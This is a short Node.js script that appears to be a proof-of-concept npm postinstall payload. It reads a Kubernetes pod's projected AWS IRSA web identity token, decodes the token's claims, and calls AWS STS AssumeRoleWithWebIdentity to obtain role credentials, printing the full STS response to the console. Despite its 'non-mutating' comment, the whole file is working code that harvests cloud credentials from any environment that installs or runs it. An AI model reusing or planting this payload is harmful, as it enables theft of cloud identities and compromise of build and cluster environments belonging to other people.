const fs = require('fs');
const https = require('https');

function b64urlDecode(s) {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}

console.log('=== POC: postinstall RCE check ===');
console.log('env AWS_ROLE_ARN =', process.env.AWS_ROLE_ARN);
console.log('env AWS_WEB_IDENTITY_TOKEN_FILE =', process.env.AWS_WEB_IDENTITY_TOKEN_FILE);

const tokenPath = process.env.AWS_WEB_IDENTITY_TOKEN_FILE;
if (tokenPath && fs.existsSync(tokenPath)) {
  const token = fs.readFileSync(tokenPath, 'utf8').trim();
  const payload = JSON.parse(b64urlDecode(token.split('.')[1]));
  console.log('projected token sub =', payload.sub);
  console.log('projected token aud =', payload.aud);

  // Non-mutating: AssumeRoleWithWebIdentity + GetCallerIdentity only. No resource touched.
  const roleArn = process.env.AWS_ROLE_ARN;
  const region = process.env.AWS_REGION || 'eu-central-1';
  const qs = new URLSearchParams({
    Action: 'AssumeRoleWithWebIdentity',
    Version: '2011-06-15',
    RoleArn: roleArn,
    RoleSessionName: 'poc-session',
    WebIdentityToken: token,
  }).toString();

  https.get(`https://sts.${region}.amazonaws.com/?${qs}`, { headers: { Accept: 'application/json' } }, res => {
    let body = '';
    res.on('data', c => body += c);
    res.on('end', () => console.log('STS AssumeRoleWithWebIdentity response:\n', body));
  }).on('error', e => console.log('STS call failed:', e.message));
} else {
  console.log('No IRSA token file found — not running as an IRSA-annotated identity.');
}
